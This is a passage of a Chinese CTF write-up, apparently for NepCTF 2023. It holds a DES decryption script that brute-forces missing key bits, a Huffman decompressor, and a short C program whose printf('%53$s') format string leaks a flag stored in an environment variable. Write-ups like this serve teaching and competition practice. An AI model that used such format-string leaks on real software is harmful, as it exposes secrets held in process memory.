class="number">13</span>, <span class="number">14</span>,  <span class="number">3</span>,  <span class="number">0</span>,  <span class="number">6</span>,  <span class="number">9</span>, <span class="number">10</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">8</span>,  <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>,  <span class="number">4</span>, <span class="number">15</span>],</span><br><span class="line">         [<span class="number">13</span>,  <span class="number">8</span>, <span class="number">11</span>,  <span class="number">5</span>,  <span class="number">6</span>, <span class="number">15</span>,  <span class="number">0</span>,  <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">7</span>,  <span class="number">2</span>, <span class="number">12</span>,  <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>,  <span class="number">9</span>],</span><br><span class="line">         [<span class="number">10</span>,  <span class="number">6</span>,  <span class="number">9</span>,  <span class="number">0</span>, <span class="number">12</span>, <span class="number">11</span>,  <span class="number">7</span>, <span class="number">13</span>, <span class="number">15</span>,  <span class="number">1</span>,  <span class="number">3</span>, <span class="number">14</span>,  <span class="number">5</span>,  <span class="number">2</span>,  <span class="number">8</span>,  <span class="number">4</span>],</span><br><span class="line">         [<span class="number">3</span>, <span class="number">15</span>,  <span class="number">0</span>,  <span class="number">6</span>, <span class="number">10</span>,  <span class="number">1</span>, <span class="number">13</span>,  <span class="number">8</span>,  <span class="number">9</span>,  <span class="number">4</span>,  <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>,  <span class="number">7</span>,  <span class="number">2</span>, <span class="number">14</span>]</span><br><span class="line">     ],</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">     [</span><br><span class="line">         [<span class="number">2</span>, <span class="number">12</span>,  <span class="number">4</span>,  <span class="number">1</span>,  <span class="number">7</span>, <span class="number">10</span>, <span class="number">11</span>,  <span class="number">6</span>,  <span class="number">8</span>,  <span class="number">5</span>,  <span class="number">3</span>, <span class="number">15</span>, <span class="number">13</span>,  <span class="number">0</span>, <span class="number">14</span>,  <span class="number">9</span>],</span><br><span class="line">         [<span class="number">14</span>, <span class="number">11</span>,  <span class="number">2</span>, <span class="number">12</span>,  <span class="number">4</span>,  <span class="number">7</span>, <span class="number">13</span>,  <span class="number">1</span>,  <span class="number">5</span>,  <span class="number">0</span>, <span class="number">15</span>, <span class="number">10</span>,  <span class="number">3</span>,  <span class="number">9</span>,  <span class="number">8</span>,  <span class="number">6</span>],</span><br><span class="line">         [<span class="number">4</span>,  <span class="number">2</span>,  <span class="number">1</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">13</span>,  <span class="number">7</span>,  <span class="number">8</span>, <span class="number">15</span>,  <span class="number">9</span>, <span class="number">12</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">3</span>,  <span class="number">0</span>, <span class="number">14</span>],</span><br><span class="line">         [<span class="number">11</span>,  <span class="number">8</span>, <span class="number">12</span>,  <span class="number">7</span>,  <span class="number">1</span>, <span class="number">14</span>,  <span class="number">2</span>, <span class="number">13</span>,  <span class="number">6</span>, <span class="number">15</span>,  <span class="number">0</span>,  <span class="number">9</span>, <span class="number">10</span>,  <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">3</span>]</span><br><span class="line">     ],</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">     [</span><br><span class="line">         [<span class="number">12</span>,  <span class="number">1</span>, <span class="number">10</span>, <span class="number">15</span>,  <span class="number">9</span>,  <span class="number">2</span>,  <span class="number">6</span>,  <span class="number">8</span>,  <span class="number">0</span>, <span class="number">13</span>,  <span class="number">3</span>,  <span class="number">4</span>, <span class="number">14</span>,  <span class="number">7</span>,  <span class="number">5</span>, <span class="number">11</span>],</span><br><span class="line">         [<span class="number">10</span>, <span class="number">15</span>,  <span class="number">4</span>,  <span class="number">2</span>,  <span class="number">7</span>, <span class="number">12</span>,  <span class="number">9</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">1</span>, <span class="number">13</span>, <span class="number">14</span>,  <span class="number">0</span>, <span class="number">11</span>,  <span class="number">3</span>,  <span class="number">8</span>],</span><br><span class="line">         [<span class="number">9</span>, <span class="number">14</span>, <span class="number">15</span>,  <span class="number">5</span>,  <span class="number">2</span>,  <span class="number">8</span>, <span class="number">12</span>,  <span class="number">3</span>,  <span class="number">7</span>,  <span class="number">0</span>,  <span class="number">4</span>, <span class="number">10</span>,  <span class="number">1</span>, <span class="number">13</span>, <span class="number">11</span>,  <span class="number">6</span>],</span><br><span class="line">         [<span class="number">4</span>,  <span class="number">3</span>,  <span class="number">2</span>, <span class="number">12</span>,  <span class="number">9</span>,  <span class="number">5</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">14</span>,  <span class="number">1</span>,  <span class="number">7</span>,  <span class="number">6</span>,  <span class="number">0</span>,  <span class="number">8</span>, <span class="number">13</span>]</span><br><span class="line">     ],</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">     [</span><br><span class="line">         [<span class="number">4</span>, <span class="number">11</span>,  <span class="number">2</span>, <span class="number">14</span>, <span class="number">15</span>,  <span class="number">0</span>,  <span class="number">8</span>, <span class="number">13</span>,  <span class="number">3</span>, <span class="number">12</span>,  <span class="number">9</span>,  <span class="number">7</span>,  <span class="number">5</span>, <span class="number">10</span>,  <span class="number">6</span>,  <span class="number">1</span>],</span><br><span class="line">         [<span class="number">13</span>,  <span class="number">0</span>, <span class="number">11</span>,  <span class="number">7</span>,  <span class="number">4</span>,  <span class="number">9</span>,  <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>,  <span class="number">3</span>,  <span class="number">5</span>, <span class="number">12</span>,  <span class="number">2</span>, <span class="number">15</span>,  <span class="number">8</span>,  <span class="number">6</span>],</span><br><span class="line">         [<span class="number">1</span>,  <span class="number">4</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">12</span>,  <span class="number">3</span>,  <span class="number">7</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">15</span>,  <span class="number">6</span>,  <span class="number">8</span>,  <span class="number">0</span>,  <span class="number">5</span>,  <span class="number">9</span>,  <span class="number">2</span>],</span><br><span class="line">         [<span class="number">6</span>, <span class="number">11</span>, <span class="number">13</span>,  <span class="number">8</span>,  <span class="number">1</span>,  <span class="number">4</span>, <span class="number">10</span>,  <span class="number">7</span>,  <span class="number">9</span>,  <span class="number">5</span>,  <span class="number">0</span>, <span class="number">15</span>, <span class="number">14</span>,  <span class="number">2</span>,  <span class="number">3</span>, <span class="number">12</span>]</span><br><span class="line">     ],</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">     [</span><br><span class="line">         [<span class="number">13</span>,  <span class="number">2</span>,  <span class="number">8</span>,  <span class="number">4</span>,  <span class="number">6</span>, <span class="number">15</span>, <span class="number">11</span>,  <span class="number">1</span>, <span class="number">10</span>,  <span class="number">9</span>,  <span class="number">3</span>, <span class="number">14</span>,  <span class="number">5</span>,  <span class="number">0</span>, <span class="number">12</span>,  <span class="number">7</span>],</span><br><span class="line">         [<span class="number">1</span>, <span class="number">15</span>, <span class="number">13</span>,  <span class="number">8</span>, <span class="number">10</span>,  <span class="number">3</span>,  <span class="number">7</span>,  <span class="number">4</span>, <span class="number">12</span>,  <span class="number">5</span>,  <span class="number">6</span>, <span class="number">11</span>,  <span class="number">0</span>, <span class="number">14</span>,  <span class="number">9</span>,  <span class="number">2</span>],</span><br><span class="line">         [<span class="number">7</span>, <span class="number">11</span>,  <span class="number">4</span>,  <span class="number">1</span>,  <span class="number">9</span>, <span class="number">12</span>, <span class="number">14</span>,  <span class="number">2</span>,  <span class="number">0</span>,  <span class="number">6</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">15</span>,  <span class="number">3</span>,  <span class="number">5</span>,  <span class="number">8</span>],</span><br><span class="line">         [<span class="number">2</span>,  <span class="number">1</span>, <span class="number">14</span>,  <span class="number">7</span>,  <span class="number">4</span>, <span class="number">10</span>,  <span class="number">8</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">12</span>,  <span class="number">9</span>,  <span class="number">0</span>,  <span class="number">3</span>,  <span class="number">5</span>,  <span class="number">6</span>, <span class="number">11</span>]</span><br><span class="line">     ]</span><br><span class="line"> ]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">S_box</span>(<span class="params">data: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">     output = []</span><br><span class="line">     <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">48</span>, <span class="number">6</span>):</span><br><span class="line">         row = data[i] * <span class="number">2</span> + data[i + <span class="number">5</span>]</span><br><span class="line">         col = reduce(add, [data[i + j] * (<span class="number">2</span> ** (<span class="number">4</span> - j)) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">5</span>)])</span><br><span class="line">         output += [<span class="built_in">int</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">format</span>(__s_box[i // <span class="number">6</span>][row][col], <span class="string">&#x27;04b&#x27;</span>)]</span><br><span class="line">     <span class="keyword">return</span> output</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">plain: <span class="type">List</span>[<span class="built_in">int</span>], sub_keys: <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]</span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">     plain = IP(plain)</span><br><span class="line">     L, R = plain[:<span class="number">32</span>], plain[<span class="number">32</span>:]</span><br><span class="line"> </span><br><span class="line">     <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">         prev_L = L</span><br><span class="line">         L = R</span><br><span class="line">         expanded_R = EP(R)</span><br><span class="line">         xor_result = [a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(expanded_R, sub_keys[i])]</span><br><span class="line">         substituted = S_box(xor_result)</span><br><span class="line">         permuted = P(substituted)</span><br><span class="line"> </span><br><span class="line">         R = [a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(permuted, prev_L)]</span><br><span class="line"> </span><br><span class="line">     cipher = R + L</span><br><span class="line">     cipher = [cipher[x] <span class="keyword">for</span> x <span class="keyword">in</span> [</span><br><span class="line">         <span class="number">39</span>,  <span class="number">7</span>, <span class="number">47</span>, <span class="number">15</span>, <span class="number">55</span>, <span class="number">23</span>, <span class="number">63</span>, <span class="number">31</span>,</span><br><span class="line">         <span class="number">38</span>,  <span class="number">6</span>, <span class="number">46</span>, <span class="number">14</span>, <span class="number">54</span>, <span class="number">22</span>, <span class="number">62</span>, <span class="number">30</span>,</span><br><span class="line">         <span class="number">37</span>,  <span class="number">5</span>, <span class="number">45</span>, <span class="number">13</span>, <span class="number">53</span>, <span class="number">21</span>, <span class="number">61</span>, <span class="number">29</span>,</span><br><span class="line">         <span class="number">36</span>,  <span class="number">4</span>, <span class="number">44</span>, <span class="number">12</span>, <span class="number">52</span>, <span class="number">20</span>, <span class="number">60</span>, <span class="number">28</span>,</span><br><span class="line">         <span class="number">35</span>,  <span class="number">3</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">51</span>, <span class="number">19</span>, <span class="number">59</span>, <span class="number">27</span>,</span><br><span class="line">         <span class="number">34</span>,  <span class="number">2</span>, <span class="number">42</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">18</span>, <span class="number">58</span>, <span class="number">26</span>,</span><br><span class="line">         <span class="number">33</span>,  <span class="number">1</span>, <span class="number">41</span>,  <span class="number">9</span>, <span class="number">49</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">25</span>,</span><br><span class="line">         <span class="number">32</span>,  <span class="number">0</span>, <span class="number">40</span>,  <span class="number">8</span>, <span class="number">48</span>, <span class="number">16</span>, <span class="number">56</span>, <span class="number">24</span>]]</span><br><span class="line"> </span><br><span class="line">     <span class="keyword">return</span> cipher</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">bitxor</span>(<span class="params">plain1: <span class="type">List</span>[<span class="built_in">int</span>], plain2: <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]</span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">     <span class="keyword">return</span> [<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">bin</span>(<span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> plain1), <span class="number">2</span>) ^ <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> plain2), <span class="number">2</span>))[<span class="number">2</span>:].zfill(<span class="number">64</span>)]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">bit_array_to_bytes</span>(<span class="params">bit_array</span>):</span><br><span class="line">     <span class="comment"># 将bit array分组为每组8个bits</span></span><br><span class="line">     byte_chunks = [bit_array[i:i+<span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(bit_array), <span class="number">8</span>)]</span><br><span class="line"> </span><br><span class="line">     <span class="comment"># 对于每个byte chunk，使用int函数将它转换为一个整数，然后使用to_bytes方法将这个整数转换为一个byte</span></span><br><span class="line">     byte_values = [<span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, chunk)), <span class="number">2</span>) <span class="keyword">for</span> chunk <span class="keyword">in</span> byte_chunks]</span><br><span class="line"> </span><br><span class="line">     <span class="comment"># 将byte value列表转换为一个bytes对象</span></span><br><span class="line">     <span class="keyword">return</span> <span class="built_in">bytes</span>(byte_values)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> t = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>]</span><br><span class="line"> <span class="comment"># 填充9位，以便后续进行爆破</span></span><br><span class="line"> LL = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;*&quot;</span>]</span><br><span class="line"> Rr = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>]</span><br><span class="line"> </span><br><span class="line"> <span class="comment"># 爆破LL</span></span><br><span class="line"> CD = LL + Rr</span><br><span class="line"> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">512</span>):</span><br><span class="line">     <span class="comment"># 遍历2^9种可能</span></span><br><span class="line"> </span><br><span class="line">     temp = CD[::]</span><br><span class="line">     bi = <span class="built_in">bin</span>(i)[<span class="number">2</span>:].zfill(<span class="number">9</span>)</span><br><span class="line">     tot = <span class="number">0</span></span><br><span class="line">     <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(temp)):</span><br><span class="line">         <span class="keyword">if</span> temp[j] == <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">             temp[j] = <span class="built_in">int</span>(bi[tot])  <span class="comment"># 将丢失的9位填充进去</span></span><br><span class="line">             tot += <span class="number">1</span></span><br><span class="line">     tempK = []</span><br><span class="line">     Z = temp</span><br><span class="line">     pt = t[:<span class="number">64</span>]</span><br><span class="line">     <span class="comment"># get_sub_key函数, 我进行了修改</span></span><br><span class="line">     c = bit_array_to_bytes(decrypt(pt, get_sub_key(Z)[::-<span class="number">1</span>]))</span><br><span class="line">     <span class="keyword">if</span> c[:<span class="number">7</span>] == <span class="string">b&#x27;NepCTF&#123;&#x27;</span>:</span><br><span class="line">         LL = temp</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">bytes_xor</span>(<span class="params">T, ct</span>):</span><br><span class="line">     <span class="keyword">return</span> [T[i] ^ ct[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ct))]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> m = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"> key = LL + Rr</span><br><span class="line"> z = [[<span class="number">0</span>]*<span class="number">56</span>]</span><br><span class="line"> <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(t), <span class="number">64</span>):</span><br><span class="line">     T1 = bytes_xor(key, z[j//<span class="number">64</span>])</span><br><span class="line">     pt = t[j:j+<span class="number">64</span>]</span><br><span class="line">     ct = bit_array_to_bytes(decrypt(pt, get_sub_key(T1)[::-<span class="number">1</span>]))</span><br><span class="line">     m += ct</span><br><span class="line">     ct = [item <span class="keyword">for</span> a1 <span class="keyword">in</span> [<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">bin</span>(flag_byte)[<span class="number">2</span>:].zfill(<span class="number">8</span>))) <span class="keyword">for</span> flag_byte <span class="keyword">in</span> ct] <span class="keyword">for</span> item <span class="keyword">in</span> a1]</span><br><span class="line">     c = PC_1(ct)</span><br><span class="line">     z.append(c)</span><br><span class="line"> <span class="built_in">print</span>(m)</span><br><span class="line"> <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"> b&#x27;NepCTF&#123;Nep_d0wn_ddddd1s&#125;&#x27;</span></span><br><span class="line"><span class="string"> &quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="codes"><a href="#codes" class="headerlink" title="codes"></a>codes</h2><p>题说flag在环境变量</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x8</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%53$s&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接梭哈。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691934322013-ad862e09-f71d-47df-a7b3-94187a5e0bfe.png#averageHue=%23f9f9f9&clientId=u3f8a18cd-6a04-4&from=paste&height=534&id=u3b93f01b&originHeight=668&originWidth=960&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=20894&status=done&style=none&taskId=u6e408870-11e3-45d0-b42b-8332a973356&title=&width=768" alt="image.png"></p>
<h2 id="与AI共舞的哈夫曼"><a href="#与AI共舞的哈夫曼" class="headerlink" title="与AI共舞的哈夫曼"></a>与AI共舞的哈夫曼</h2><p>直接问chatgpt要个哈夫曼解压缩的脚本就行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> heapq</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decompress</span>(<span class="params">input_file, output_file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="comment"># Read frequency information</span></span><br><span class="line">        num_freq = <span class="built_in">int</span>.from_bytes(f.read(<span class="number">1</span>), byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        frequencies = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(num_freq):</span><br><span class="line">            byte = <span class="built_in">ord</span>(f.read(<span class="number">1</span>))</span><br><span class="line">            freq = (<span class="built_in">ord</span>(f.read(<span class="number">1</span>)) &lt;&lt; <span class="number">24</span>) | (<span class="built_in">ord</span>(f.read(<span class="number">1</span>)) &lt;&lt; <span class="number">16</span>) | (<span class="built_in">ord</span>(f.read(<span class="number">1</span>)) &lt;&lt; <span class="number">8</span>) | <span class="built_in">ord</span>(f.read(<span class="number">1</span>))</span><br><span class="line">            frequencies[byte] = freq</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Build Huffman tree</span></span><br><span class="line">        root = build_huffman_tree(frequencies)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Read compressed data</span></span><br><span class="line">        compressed_data = f.read()</span><br><span class="line"></span><br><span class="line">    current_node = root</span><br><span class="line">    decompressed_data = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> compressed_data:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">            bit = (byte &gt;&gt; i) &amp; <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> bit == <span class="number">0</span>:  <span class="comment"># &#x27;0&#x27;</span></span><br><span class="line">                current_node = current_node.left</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                current_node = current_node.right</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> current_node.char <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                decompressed_data.append(<span class="built_in">chr</span>(current_node.char))  <span class="comment"># Convert int to character</span></span><br><span class="line">                current_node = root</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span 